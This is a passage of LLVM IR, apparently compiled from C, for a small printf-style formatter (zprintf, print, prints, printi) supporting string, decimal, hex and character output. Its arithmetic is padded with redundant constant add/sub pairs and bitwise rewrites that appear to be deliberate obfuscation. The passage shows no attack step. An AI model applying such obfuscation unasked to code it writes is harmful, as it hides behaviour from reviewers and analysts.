  %66 = sub i32 %65, %64
  %67 = sub i32 %66, 1108848828
  %68 = sub nsw i32 %63, %64
  %69 = sext i32 %67 to i64
  %70 = getelementptr inbounds i8, i8* %62, i64 %69
  store i8 %61, i8* %70, align 1
  br label %71

; <label>:71:                                     ; preds = %56
  %72 = load i32, i32* %3, align 4
  %73 = sub i32 %72, 184081783
  %74 = add i32 %73, 1
  %75 = add i32 %74, 184081783
  %76 = add nsw i32 %72, 1
  store i32 %75, i32* %3, align 4
  br label %52

; <label>:77:                                     ; preds = %52
  %78 = load i8*, i8** %2, align 8
  %79 = load i32, i32* %3, align 4
  %80 = load i32, i32* %4, align 4
  %81 = add i32 %79, -1865615798
  %82 = sub i32 %81, %80
  %83 = sub i32 %82, -1865615798
  %84 = sub nsw i32 %79, %80
  %85 = sext i32 %83 to i64
  %86 = getelementptr inbounds i8, i8* %78, i64 %85
  store i8 0, i8* %86, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %347, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %350

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %335

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %350

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %336

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %70

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = xor i32 %53, -1
  %55 = xor i32 2, -1
  %56 = xor i32 1057256835, -1
  %57 = and i32 %54, 1057256835
  %58 = and i32 %53, %56
  %59 = and i32 %55, 1057256835
  %60 = and i32 2, %56
  %61 = or i32 %57, %58
  %62 = or i32 %59, %60
  %63 = xor i32 %61, %62
  %64 = or i32 %54, %55
  %65 = xor i32 %64, -1
  %66 = or i32 1057256835, %56
  %67 = and i32 %65, %66
  %68 = or i32 %63, %67
  %69 = or i32 %53, 2
  store i32 %68, i32* %8, align 4
  br label %45

; <label>:70:                                     ; preds = %45
  br label %71

; <label>:71:                                     ; preds = %98, %70
  %72 = load i8*, i8** %5, align 8
  %73 = load i8, i8* %72, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp sge i32 %74, 48
  br i1 %75, label %76, label %81

; <label>:76:                                     ; preds = %71
  %77 = load i8*, i8** %5, align 8
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sle i32 %79, 57
  br label %81

; <label>:81:                                     ; preds = %76, %71
  %82 = phi i1 [ false, %71 ], [ %80, %76 ]
  br i1 %82, label %83, label %101

; <label>:83:                                     ; preds = %81
  %84 = load i32, i32* %7, align 4
  %85 = mul nsw i32 %84, 10
  store i32 %85, i32* %7, align 4
  %86 = load i8*, i8** %5, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = sub i32 %88, 54429693
  %90 = sub i32 %89, 48
  %91 = add i32 %90, 54429693
  %92 = sub nsw i32 %88, 48
  %93 = load i32, i32* %7, align 4
  %94 = add i32 %93, -1581882608
  %95 = add i32 %94, %91
  %96 = sub i32 %95, -1581882608
  %97 = add nsw i32 %93, %91
  store i32 %96, i32* %7, align 4
  br label %98

; <label>:98:                                     ; preds = %83
  %99 = load i8*, i8** %5, align 8
  %100 = getelementptr inbounds i8, i8* %99, i32 1
  store i8* %100, i8** %5, align 8
  br label %71

; <label>:101:                                    ; preds = %81
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 115
  br i1 %105, label %106, label %147

; <label>:106:                                    ; preds = %101
  %107 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %108 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 0
  %109 = load i32, i32* %108, align 8
  %110 = icmp ule i32 %109, 40
  br i1 %110, label %111, label %121

; <label>:111:                                    ; preds = %106
  %112 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 3
  %113 = load i8*, i8** %112, align 8
  %114 = getelementptr i8, i8* %113, i32 %109
  %115 = bitcast i8* %114 to i32*
  %116 = sub i32 0, %109
  %117 = sub i32 0, 8
  %118 = add i32 %116, %117
  %119 = sub i32 0, %118
  %120 = add i32 %109, 8
  store i32 %119, i32* %108, align 8
  br label %126

; <label>:121:                                    ; preds = %106
  %122 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 2
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to i32*
  %125 = getelementptr i8, i8* %123, i32 8
  store i8* %125, i8** %122, align 8
  br label %126

; <label>:126:                                    ; preds = %121, %111
  %127 = phi i32* [ %115, %111 ], [ %124, %121 ]
  %128 = load i32, i32* %127, align 4
  %129 = sext i32 %128 to i64
  %130 = inttoptr i64 %129 to i8*
  store i8* %130, i8** %11, align 8
  %131 = load i8**, i8*** %4, align 8
  %132 = load i8*, i8** %11, align 8
  %133 = icmp ne i8* %132, null
  br i1 %133, label %134, label %136

; <label>:134:                                    ; preds = %126
  %135 = load i8*, i8** %11, align 8
  br label %137

; <label>:136:                                    ; preds = %126
  br label %137

; <label>:137:                                    ; preds = %136, %134
  %138 = phi i8* [ %135, %134 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.112, i32 0, i32 0), %136 ]
  %139 = load i32, i32* %7, align 4
  %140 = load i32, i32* %8, align 4
  %141 = call i32 @prints(i8** %131, i8* %138, i32 %139, i32 %140)
  %142 = load i32, i32* %9, align 4
  %143 = add i32 %142, -1186031069
  %144 = add i32 %143, %141
  %145 = sub i32 %144, -1186031069
  %146 = add nsw i32 %142, %141
  store i32 %145, i32* %9, align 4
  br label %347

; <label>:147:                                    ; preds = %101
  %148 = load i8*, i8** %5, align 8
  %149 = load i8, i8* %148, align 1
  %150 = zext i8 %149 to i32
  %151 = icmp eq i32 %150, 100
  br i1 %151, label %152, label %185

; <label>:152:                                    ; preds = %147
  %153 = load i8**, i8*** %4, align 8
  %154 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %155 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %154, i32 0, i32 0
  %156 = load i32, i32* %155, align 8
  %157 = icmp ule i32 %156, 40
  br i1 %157, label %158, label %168

; <label>:158:                                    ; preds = %152
  %159 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %154, i32 0, i32 3
  %160 = load i8*, i8** %159, align 8
  %161 = getelementptr i8, i8* %160, i32 %156
  %162 = bitcast i8* %161 to i32*
  %163 = sub i32 0, %156
  %164 = sub i32 0, 8
  %165 = add i32 %163, %164
  %166 = sub i32 0, %165
  %167 = add i32 %156, 8
  store i32 %166, i32* %155, align 8
  br label %173

; <label>:168:                                    ; preds = %152
  %169 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %154, i32 0, i32 2
  %170 = load i8*, i8** %169, align 8
  %171 = bitcast i8* %170 to i32*
  %172 = getelementptr i8, i8* %170, i32 8
  store i8* %172, i8** %169, align 8
  br label %173

; <label>:173:                                    ; preds = %168, %158
  %174 = phi i32* [ %162, %158 ], [ %171, %168 ]
  %175 = load i32, i32* %174, align 4
  %176 = load i32, i32* %7, align 4
  %177 = load i32, i32* %8, align 4
  %178 = call i32 @printi(i8** %153, i32 %175, i32 10, i32 1, i32 %176, i32 %177, i32 97)
  %179 = load i32, i32* %9, align 4
  %180 = sub i32 0, %179
  %181 = sub i32 0, %178
  %182 = add i32 %180, %181
  %183 = sub i32 0, %182
  %184 = add nsw i32 %179, %178
  store i32 %183, i32* %9, align 4
  br label %347

; <label>:185:                                    ; preds = %147
  %186 = load i8*, i8** %5, align 8
  %187 = load i8, i8* %186, align 1
  %188 = zext i8 %187 to i32
  %189 = icmp eq i32 %188, 120
  br i1 %189, label %190, label %220

; <label>:190:                                    ; preds = %185
  %191 = load i8**, i8*** %4, align 8
  %192 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %193 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %192, i32 0, i32 0
  %194 = load i32, i32* %193, align 8
  %195 = icmp ule i32 %194, 40
  br i1 %195, label %196, label %204

; <label>:196:                                    ; preds = %190
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %192, i32 0, i32 3
  %198 = load i8*, i8** %197, align 8
  %199 = getelementptr i8, i8* %198, i32 %194
  %200 = bitcast i8* %199 to i32*
  %201 = sub i32 0, 8
  %202 = sub i32 %194, %201
  %203 = add i32 %194, 8
  store i32 %202, i32* %193, align 8
  br label %209

; <label>:204:                                    ; preds = %190
  %205 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %192, i32 0, i32 2
  %206 = load i8*, i8** %205, align 8
  %207 = bitcast i8* %206 to i32*
  %208 = getelementptr i8, i8* %206, i32 8
  store i8* %208, i8** %205, align 8
  br label %209

; <label>:209:                                    ; preds = %204, %196
  %210 = phi i32* [ %200, %196 ], [ %207, %204 ]
  %211 = load i32, i32* %210, align 4
  %212 = load i32, i32* %7, align 4
  %213 = load i32, i32* %8, align 4
  %214 = call i32 @printi(i8** %191, i32 %211, i32 16, i32 0, i32 %212, i32 %213, i32 97)
  %215 = load i32, i32* %9, align 4
  %216 = sub i32 %215, -1458856673
  %217 = add i32 %216, %214
  %218 = add i32 %217, -1458856673
  %219 = add nsw i32 %215, %214
  store i32 %218, i32* %9, align 4
  br label %347

; <label>:220:                                    ; preds = %185
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 88
  br i1 %224, label %225, label %257

; <label>:225:                                    ; preds = %220
  %226 = load i8**, i8*** %4, align 8
  %227 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %228 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %227, i32 0, i32 0
  %229 = load i32, i32* %228, align 8
  %230 = icmp ule i32 %229, 40
  br i1 %230, label %231, label %241

; <label>:231:                                    ; preds = %225
  %232 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %227, i32 0, i32 3
  %233 = load i8*, i8** %232, align 8
  %234 = getelementptr i8, i8* %233, i32 %229
  %235 = bitcast i8* %234 to i32*
  %236 = sub i32 0, %229
  %237 = sub i32 0, 8
  %238 = add i32 %236, %237
  %239 = sub i32 0, %238
  %240 = add i32 %229, 8
  store i32 %239, i32* %228, align 8
  br label %246

; <label>:241:                                    ; preds = %225
  %242 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %227, i32 0, i32 2
  %243 = load i8*, i8** %242, align 8
  %244 = bitcast i8* %243 to i32*
  %245 = getelementptr i8, i8* %243, i32 8
  store i8* %245, i8** %242, align 8
  br label %246

; <label>:246:                                    ; preds = %241, %231
  %247 = phi i32* [ %235, %231 ], [ %244, %241 ]
  %248 = load i32, i32* %247, align 4
  %249 = load i32, i32* %7, align 4
  %250 = load i32, i32* %8, align 4
  %251 = call i32 @printi(i8** %226, i32 %248, i32 16, i32 0, i32 %249, i32 %250, i32 65)
  %252 = load i32, i32* %9, align 4
  %253 = sub i32 %252, -563081964
  %254 = add i32 %253, %251
  %255 = add i32 %254, -563081964
  %256 = add nsw i32 %252, %251
  store i32 %255, i32* %9, align 4
  br label %347

; <label>:257:                                    ; preds = %220
  %258 = load i8*, i8** %5, align 8
  %259 = load i8, i8* %258, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp eq i32 %260, 117
  br i1 %261, label %262, label %294

; <label>:262:                                    ; preds = %257
  %263 = load i8**, i8*** %4, align 8
  %264 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %265 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %264, i32 0, i32 0
  %266 = load i32, i32* %265, align 8
  %267 = icmp ule i32 %266, 40
  br i1 %267, label %268, label %277

; <label>:268:                                    ; preds = %262
  %269 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %264, i32 0, i32 3
  %270 = load i8*, i8** %269, align 8
  %271 = getelementptr i8, i8* %270, i32 %266
  %272 = bitcast i8* %271 to i32*
  %273 = add i32 %266, -808130375
  %274 = add i32 %273, 8
  %275 = sub i32 %274, -808130375
  %276 = add i32 %266, 8
  store i32 %275, i32* %265, align 8
  br label %282

; <label>:277:                                    ; preds = %262
  %278 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %264, i32 0, i32 2
  %279 = load i8*, i8** %278, align 8
  %280 = bitcast i8* %279 to i32*
  %281 = getelementptr i8, i8* %279, i32 8
  store i8* %281, i8** %278, align 8
  br label %282

; <label>:282:                                    ; preds = %277, %268
  %283 = phi i32* [ %272, %268 ], [ %280, %277 ]
  %284 = load i32, i32* %283, align 4
  %285 = load i32, i32* %7, align 4
  %286 = load i32, i32* %8, align 4
  %287 = call i32 @printi(i8** %263, i32 %284, i32 10, i32 0, i32 %285, i32 %286, i32 97)
  %288 = load i32, i32* %9, align 4
  %289 = sub i32 0, %288
  %290 = sub i32 0, %287
  %291 = add i32 %289, %290
  %292 = sub i32 0, %291
  %293 = add nsw i32 %288, %287
  store i32 %292, i32* %9, align 4
  br label %347

; <label>:294:                                    ; preds = %257
  %295 = load i8*, i8** %5, align 8
  %296 = load i8, i8* %295, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp eq i32 %297, 99
  br i1 %298, label %299, label %334

; <label>:299:                                    ; preds = %294
  %300 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %301 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 0
  %302 = load i32, i32* %301, align 8
  %303 = icmp ule i32 %302, 40
  br i1 %303, label %304, label %313

; <label>:304:                                    ; preds = %299
  %305 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 3
  %306 = load i8*, i8** %305, align 8
  %307 = getelementptr i8, i8* %306, i32 %302
  %308 = bitcast i8* %307 to i32*
  %309 = sub i32 %302, 680542557
  %310 = add i32 %309, 8
  %311 = add i32 %310, 680542557
  %312 = add i32 %302, 8
  store i32 %311, i32* %301, align 8
  br label %318

; <label>:313:                                    ; preds = %299
  %314 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %300, i32 0, i32 2
  %315 = load i8*, i8** %314, align 8
  %316 = bitcast i8* %315 to i32*
  %317 = getelementptr i8, i8* %315, i32 8
  store i8* %317, i8** %314, align 8
  br label %318

; <label>:318:                                    ; preds = %313, %304
  %319 = phi i32* [ %308, %304 ], [ %316, %313 ]
  %320 = load i32, i32* %319, align 4
  %321 = trunc i32 %320 to i8
  %322 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %321, i8* %322, align 1
  %323 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %323, align 1
  %324 = load i8**, i8*** %4, align 8
  %325 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %326 = load i32, i32* %7, align 4
  %327 = load i32, i32* %8, align 4
  %328 = call i32 @prints(i8** %324, i8* %325, i32 %326, i32 %327)
  %329 = load i32, i32* %9, align 4
  %330 = add i32 %329, 2019878201
  %331 = add i32 %330, %328
  %332 = sub i32 %331, 2019878201
  %333 = add nsw i32 %329, %328
  store i32 %332, i32* %9, align 4
  br label %347

; <label>:334:                                    ; preds = %294
  br label %346

; <label>:335:                                    ; preds = %17
  br label %336

; <label>:336:                                    ; preds = %335, %35
  %337 = load i8**, i8*** %4, align 8
  %338 = load i8*, i8** %5, align 8
  %339 = load i8, i8* %338, align 1
  %340 = zext i8 %339 to i32
  call void @printchar(i8** %337, i32 %340)
  %341 = load i32, i32* %9, align 4
  %342 = sub i32 %341, 401077232
  %343 = add i32 %342, 1
  %344 = add i32 %343, 401077232
  %345 = add nsw i32 %341, 1
  store i32 %344, i32* %9, align 4
  br label %346

; <label>:346:                                    ; preds = %336, %334
  br label %347

; <label>:347:                                    ; preds = %346, %318, %282, %246, %209, %173, %137
  %348 = load i8*, i8** %5, align 8
  %349 = getelementptr inbounds i8, i8* %348, i32 1
  store i8* %349, i8** %5, align 8
  br label %12

; <label>:350:                                    ; preds = %29, %12
  %351 = load i8**, i8*** %4, align 8
  %352 = icmp ne i8** %351, null
  br i1 %352, label %353, label %356

; <label>:353:                                    ; preds = %350
  %354 = load i8**, i8*** %4, align 8
  %355 = load i8*, i8** %354, align 8
  store i8 0, i8* %355, align 1
  br label %356

; <label>:356:                                    ; preds = %353, %350
  %357 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %358 = bitcast %struct.__va_list_tag* %357 to i8*
  call void @llvm.va_end(i8* %358)
  %359 = load i32, i32* %9, align 4
  ret i32 %359
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %51

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %28, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %31

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 0, %22
  %24 = sub i32 0, 1
  %25 = add i32 %23, %24
  %26 = sub i32 0, %25
  %27 = add nsw i32 %22, 1
  store i32 %26, i32* %11, align 4
  br label %28

; <label>:28:                                     ; preds = %21
  %29 = load i8*, i8** %12, align 8
  %30 = getelementptr inbounds i8, i8* %29, i32 1
  store i8* %30, i8** %12, align 8
  br label %17

; <label>:31:                                     ; preds = %17
  %32 = load i32, i32* %11, align 4
  %33 = load i32, i32* %7, align 4
  %34 = icmp sge i32 %32, %33
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %31
  store i32 0, i32* %7, align 4
  br label %42

; <label>:36:                                     ; preds = %31
  %37 = load i32, i32* %11, align 4
  %38 = load i32, i32* %7, align 4
  %39 = sub i32 0, %37
  %40 = add i32 %38, %39
  %41 = sub nsw i32 %38, %37
  store i32 %40, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %36, %35
  %43 = load i32, i32* %8, align 4
  %44 = xor i32 2, -1
  %45 = xor i32 %43, %44
  %46 = and i32 %45, %43
  %47 = and i32 %43, 2
  %48 = icmp ne i32 %46, 0
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %42
  store i32 48, i32* %10, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %42
  br label %51

; <label>:51:                                     ; preds = %50, %4
  %52 = load i32, i32* %8, align 4
  %53 = xor i32 1, -1
  %54 = xor i32 %52, %53
  %55 = and i32 %54, %52
  %56 = and i32 %52, 1
  %57 = icmp ne i32 %55, 0
  br i1 %57, label %75, label %58

; <label>:58:                                     ; preds = %51
  br label %59

; <label>:59:                                     ; preds = %69, %58
  %60 = load i32, i32* %7, align 4
  %61 = icmp sgt i32 %60, 0
  br i1 %61, label %62, label %74

; <label>:62:                                     ; preds = %59
  %63 = load i8**, i8*** %5, align 8
  %64 = load i32, i32* %10, align 4
  call void @printchar(i8** %63, i32 %64)
  %65 = load i32, i32* %9, align 4
  %66 = sub i32 0, 1
  %67 = sub i32 %65, %66
  %68 = add nsw i32 %65, 1
  store i32 %67, i32* %9, align 4
  br label %69

; <label>:69:                                     ; preds = %62
  %70 = load i32, i32* %7, align 4
  %71 = sub i32 0, -1
  %72 = sub i32 %70, %71
  %73 = add nsw i32 %70, -1
  store i32 %72, i32* %7, align 4
  br label %59

; <label>:74:                                     ; preds = %59
  br label %75

; <label>:75:                                     ; preds = %74, %51
  br label %76

; <label>:76:                                     ; preds = %90, %75
  %77 = load i8*, i8** %6, align 8
  %78 = load i8, i8* %77, align 1
  %79 = icmp ne i8 %78, 0
  br i1 %79, label %80, label %93

; <label>:80:                                     ; preds = %76
  %81 = load i8**, i8*** %5, align 8
  %82 = load i8*, i8** %6, align 8
  %83 = load i8, i8* %82, align 1
  %84 = zext i8 %83 to i32
  call void @printchar(i8** %81, i32 %84)
  %85 = load i32, i32* %9, align 4
  %86 = add i32 %85, -1642727203
  %87 = add i32 %86, 1
  %88 = sub i32 %87, -1642727203
  %89 = add nsw i32 %85, 1
  store i32 %88, i32* %9, align 4
  br label %90

; <label>:90:                                     ; preds = %80
  %91 = load i8*, i8** %6, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %6, align 8
  br label %76

; <label>:93:                                     ; preds = %76
  br label %94

; <label>:94:                                     ; preds = %104, %93
  %95 = load i32, i32* %7, align 4
  %96 = icmp sgt i32 %95, 0
  br i1 %96, label %97, label %110

; <label>:97:                                     ; preds = %94
  %98 = load i8**, i8*** %5, align 8
  %99 = load i32, i32* %10, align 4
  call void @printchar(i8** %98, i32 %99)
  %100 = load i32, i32* %9, align 4
  %101 = sub i32 0, 1
  %102 = sub i32 %100, %101
  %103 = add nsw i32 %100, 1
  store i32 %102, i32* %9, align 4
  br label %104

; <label>:104:                                    ; preds = %97
  %105 = load i32, i32* %7, align 4
  %106 = add i32 %105, 831229824
  %107 = add i32 %106, -1
  %108 = sub i32 %107, 831229824
  %109 = add nsw i32 %105, -1
  store i32 %108, i32* %7, align 4
  br label %94

; <label>:110:                                    ; preds = %94
  %111 = load i32, i32* %9, align 4
  ret i32 %111
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %130

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %47

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %47

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %47

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, %43
  %45 = add i32 0, %44
  %46 = sub nsw i32 0, %43
  store i32 %45, i32* %21, align 4
  br label %47

; <label>:47:                                     ; preds = %42, %39, %36, %33
  %48 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %49 = getelementptr inbounds i8, i8* %48, i64 12
  %50 = getelementptr inbounds i8, i8* %49, i64 -1
  store i8* %50, i8** %17, align 8
  %51 = load i8*, i8** %17, align 8
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %75, %47
  %53 = load i32, i32* %21, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %87

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* %21, align 4
  %57 = load i32, i32* %11, align 4
  %58 = urem i32 %56, %57
  store i32 %58, i32* %18, align 4
  %59 = load i32, i32* %18, align 4
  %60 = icmp sge i32 %59, 10
  br i1 %60, label %61, label %75

; <label>:61:                                     ; preds = %55
  %62 = load i32, i32* %15, align 4
  %63 = add i32 %62, -946607831
  %64 = sub i32 %63, 48
  %65 = sub i32 %64, -946607831
  %66 = sub nsw i32 %62, 48
  %67 = sub i32 0, 10
  %68 = add i32 %65, %67
  %69 = sub nsw i32 %65, 10
  %70 = load i32, i32* %18, align 4
  %71 = sub i32 %70, -2046210573
  %72 = add i32 %71, %68
  %73 = add i32 %72, -2046210573
  %74 = add nsw i32 %70, %68
  store i32 %73, i32* %18, align 4
  br label %75

; <label>:75:                                     ; preds = %61, %55
  %76 = load i32, i32* %18, align 4
  %77 = sub i32 %76, 497558401
  %78 = add i32 %77, 48
  %79 = add i32 %78, 497558401
  %80 = add nsw i32 %76, 48
  %81 = trunc i32 %79 to i8
  %82 = load i8*, i8** %17, align 8
  %83 = getelementptr inbounds i8, i8* %82, i32 -1
  store i8* %83, i8** %17, align 8
  store i8 %81, i8* %83, align 1
  %84 = load i32, i32* %11, align 4
  %85 = load i32, i32* %21, align 4
  %86 = udiv i32 %85, %84
  store i32 %86, i32* %21, align 4
  br label %52

; <label>:87:                                     ; preds = %52
  %88 = load i32, i32* %19, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %119

; <label>:90:                                     ; preds = %87
  %91 = load i32, i32* %13, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %115

; <label>:93:                                     ; preds = %90
  %94 = load i32, i32* %14, align 4
